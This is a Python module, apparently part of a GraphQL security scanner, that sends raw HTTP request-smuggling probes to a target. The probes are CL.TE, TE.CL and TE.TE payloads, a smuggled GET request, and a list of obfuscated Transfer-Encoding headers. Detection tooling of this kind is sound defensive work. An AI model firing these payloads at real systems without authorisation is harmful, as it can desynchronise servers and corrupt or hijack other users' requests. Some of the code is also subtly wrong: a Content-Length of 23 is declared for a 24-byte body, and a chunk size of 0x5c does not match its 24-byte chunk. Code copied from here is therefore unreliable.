"""HTTP Request Smuggling detection for GraphQL endpoints."""

from __future__ import annotations

import logging
import socket
import ssl
import time
from dataclasses import dataclass
from enum import Enum, auto

logger = logging.getLogger("gradientql.smuggler")


class SmugglingType(Enum):
    CL_TE = auto()
    TE_CL = auto()
    TE_TE = auto()
    H2_DOWNGRADE = auto()


@dataclass
class SmugglingResult:
    """Outcome of a single smuggling probe against one endpoint."""

    vulnerable: bool
    smuggling_type: SmugglingType | None
    confidence: str
    evidence: str
    detection_method: str
    time_based_delay: float | None = None
    

class GraphQLSmuggler:
    """Sends crafted raw HTTP requests to detect front/back-end desync at a target."""

    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.host, self.port, self.use_ssl = self._parse_url(target_url)
        
    def _parse_url(self, url: str) -> tuple[str, int, bool]:
        from urllib.parse import urlparse
        parsed = urlparse(url)
        host = parsed.hostname or "localhost"
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"
        return host, port, use_ssl
    
    def _send_raw(self, request: bytes) -> tuple[bytes, float]:
        """Send raw bytes and read the reply, returning (response, elapsed_seconds).

        Reads until Content-Length is satisfied, the chunked terminator arrives, or
        the socket times out, so a smuggling-induced hang shows up as elapsed time.
        """
        start_time = time.time()
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        
        try:
            sock.connect((self.host, self.port))
            
            if self.use_ssl:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            sock.sendall(request)

            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if b"\r\n\r\n" in response:
                        headers = response.split(b"\r\n\r\n")[0]
                        if b"Content-Length:" in headers:
                            content_length = int(
                                headers.split(b"Content-Length:")[1].split(b"\r\n")[0].strip()
                            )
                            body_start = response.find(b"\r\n\r\n") + 4
                            if len(response) >= body_start + content_length:
                                break
                        elif b"Transfer-Encoding: chunked" in headers:
                            if b"\r\n0\r\n\r\n" in response:
                                break
                        else:
                            break
                except socket.timeout:
                    break
            
            elapsed = time.time() - start_time
            return response, elapsed
            
        finally:
            sock.close()
    
    def _build_cl_te_probe(self) -> bytes:
        body = '{"query":"{__typename}"}'
        smuggled = (
            'POST /graphql HTTP/1.1\r\n'
            f'Host: {self.host}\r\n'
            'Content-Type: application/json\r\n'
            'Content-Length: 4\r\n'
            'Transfer-Encoding: chunked\r\n'
            '\r\n'
            '5c\r\n'
            f'{body}\r\n'
            '0\r\n'
            '\r\n'
            'GET /smuggled HTTP/1.1\r\n'
            'Host: smuggled.com\r\n'
            '\r\n'
        )
        return smuggled.encode()
    
    def _build_te_cl_probe(self) -> bytes:
        body = '{"query":"{__typename}"}'
        smuggled = (
            'POST /graphql HTTP/1.1\r\n'
            f'Host: {self.host}\r\n'
            'Content-Type: application/json\r\n'
            'Transfer-Encoding: chunked\r\n'
            'Content-Length: 6\r\n'
            '\r\n'
            '0\r\n'
            '\r\n'
            f'{body}\r\n'
        )
        return smuggled.encode()
    
    def _build_te_te_probe(self) -> bytes:
        body = '{"query":"{__typename}"}'
        smuggled = (
            'POST /graphql HTTP/1.1\r\n'
            f'Host: {self.host}\r\n'
            'Content-Type: application/json\r\n'
            'Transfer-Encoding: chunked\r\n'
            'Transfer-Encoding: identity\r\n'
            'Content-Length: 4\r\n'
            '\r\n'
            '5c\r\n'
            f'{body}\r\n'
            '0\r\n'
            '\r\n'
            'GET /smuggled HTTP/1.1\r\n'
            f'Host: {self.host}\r\n'
            '\r\n'
        )
        return smuggled.encode()
    
    def _build_time_delay_probe(self, smuggling_type: SmugglingType) -> bytes:
        if smuggling_type == SmugglingType.CL_TE:
            return (
                'POST /graphql HTTP/1.1\r\n'
                f'Host: {self.host}\r\n'
                'Content-Type: application/json\r\n'
                'Content-Length: 4\r\n'
                'Transfer-Encoding: chunked\r\n'
                '\r\n'
                '0\r\n'
                '\r\n'
                'X'
            ).encode()
        elif smuggling_type == SmugglingType.TE_CL:
            return (
                'POST /graphql HTTP/1.1\r\n'
                f'Host: {self.host}\r\n'
                'Content-Type: application/json\r\n'
                'Transfer-Encoding: chunked\r\n'
                'Content-Length: 5\r\n'
                '\r\n'
                '0\r\n'
                '\r\n'
            ).encode()
        return b""
    
    def test_cl_te(self) -> SmugglingResult:
        """Probe CL.TE desync via a >5s delay over baseline, then differential response."""
        logger.info("Testing CL.TE smuggling...")

        baseline_request = (
            'POST /graphql HTTP/1.1\r\n'
            f'Host: {self.host}\r\n'
            'Content-Type: application/json\r\n'
            'Content-Length: 23\r\n'
            '\r\n'
            '{"query":"{__typename}"}'
        ).encode()
        
        _, baseline_time = self._send_raw(baseline_request)

        probe = self._build_time_delay_probe(SmugglingType.CL_TE)
        _, delay_time = self._send_raw(probe)

        if delay_time > baseline_time + 5:
            return SmugglingResult(
                vulnerable=True,
                smuggling_type=SmugglingType.CL_TE,
                confidence="high",
                evidence=f"Time delay detected: {delay_time:.1f}s vs baseline {baseline_time:.1f}s",
                detection_method="time_delay",
                time_based_delay=delay_time
            )
        
        probe = self._build_cl_te_probe()
        response, _ = self._send_raw(probe)

        if b"timeout" in response.lower() or b"smuggled" in response.lower():
            return SmugglingResult(
                vulnerable=True,
                smuggling_type=SmugglingType.CL_TE,
                confidence="medium",
                evidence=f"Response indicates desync: {response[:200]}",
                detection_method="differential_response"
            )
        
        return SmugglingResult(
            vulnerable=False,
            smuggling_type=None,
            confidence="none",
            evidence="No smuggling indicators detected",
            detection_method="all"
        )
    
    def test_te_cl(self) -> SmugglingResult:
        """Probe TE.CL desync, flagging vulnerable on a >5s delay over baseline."""
        logger.info("Testing TE.CL smuggling...")

        baseline_request = (
            'POST /graphql HTTP/1.1\r\n'
            f'Host: {self.host}\r\n'
            'Content-Type: application/json\r\n'
            'Content-Length: 23\r\n'
            '\r\n'
            '{"query":"{__typename}"}'
        ).encode()
        
        _, baseline_time = self._send_raw(baseline_request)
        probe = self._build_time_delay_probe(SmugglingType.TE_CL)
        _, delay_time = self._send_raw(probe)
        
        if delay_time > baseline_time + 5:
            return SmugglingResult(
                vulnerable=True,
                smuggling_type=SmugglingType.TE_CL,
                confidence="high",
                evidence=f"Time delay detected: {delay_time:.1f}s vs baseline {baseline_time:.1f}s",
                detection_method="time_delay",
                time_based_delay=delay_time
            )
        
        return SmugglingResult(
            vulnerable=False,
            smuggling_type=None,
            confidence="none",
            evidence="No TE.CL indicators detected",
            detection_method="all"
        )
    
    def test_te_te(self) -> SmugglingResult:
        """Try obfuscated Transfer-Encoding headers, flagging any variant that stalls >3s."""
        logger.info("Testing TE.TE header obfuscation...")
        
        variants = [
            b"Transfer-Encoding : chunked",
            b"Transfer-Encoding:  chunked",
            b"Transfer-Encoding:\tchunked",
            b"transfer-encoding: chunked",
            b"TRANSFER-ENCODING: chunked",
            b"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
            b"Transfer-Encoding: identity\r\nTransfer-Encoding: chunked",
            b"Transfer-Encoding: chunked\r",
            b"Transfer-Encoding: chunked\n",
            b"Transfer-Encoding: \x00chunked",
        ]
        
        for variant in variants:
            probe = (
                b'POST /graphql HTTP/1.1\r\n'
                b'Host: ' + self.host.encode() + b'\r\n'
                b'Content-Type: application/json\r\n'
                + variant + b'\r\n'
                b'Content-Length: 5\r\n'
                b'\r\n'
                b'0\r\n'
                b'\r\n'
            )
            
            response, delay = self._send_raw(probe)

            if delay > 3:
                return SmugglingResult(
                    vulnerable=True,
                    smuggling_type=SmugglingType.TE_TE,
                    confidence="medium",
                    evidence=f"Header variant caused delay: {variant!r}",
                    detection_method="header_obfuscation",
                    time_based_delay=delay
                )
        
        return SmugglingResult(
            vulnerable=False,
            smuggling_type=None,
            confidence="none",
            evidence="No TE.TE indicators detected",
            detection_method="all"
        )
    
    def run_all_tests(self) -> list[SmugglingResult]:
        """Run every probe and return only the results flagged vulnerable."""
        logger.info("Starting HTTP Request Smuggling detection...")
        
        results = []

        try:
            result = self.test_cl_te()
            if result.vulnerable:
                results.append(result)
                logger.warning(f"CL.TE vulnerability detected! Confidence: {result.confidence}")
        except Exception as e:
            logger.error(f"CL.TE test failed: {e}")

        try:
            result = self.test_te_cl()
            if result.vulnerable:
                results.append(result)
                logger.warning(f"TE.CL vulnerability detected! Confidence: {result.confidence}")
        except Exception as e:
            logger.error(f"TE.CL test failed: {e}")

        try:
            result = self.test_te_te()
            if result.vulnerable:
                results.append(result)
                logger.warning(f"TE.TE vulnerability detected! Confidence: {result.confidence}")
        except Exception as e:
            logger.error(f"TE.TE test failed: {e}")
        
        if not results:
            logger.info("No HTTP Request Smuggling vulnerabilities detected")
        
        return results


def check_smuggling(target_url: str, timeout: int = 10) -> list[SmugglingResult]:
    smuggler = GraphQLSmuggler(target_url, timeout)
    return smuggler.run_all_tests()
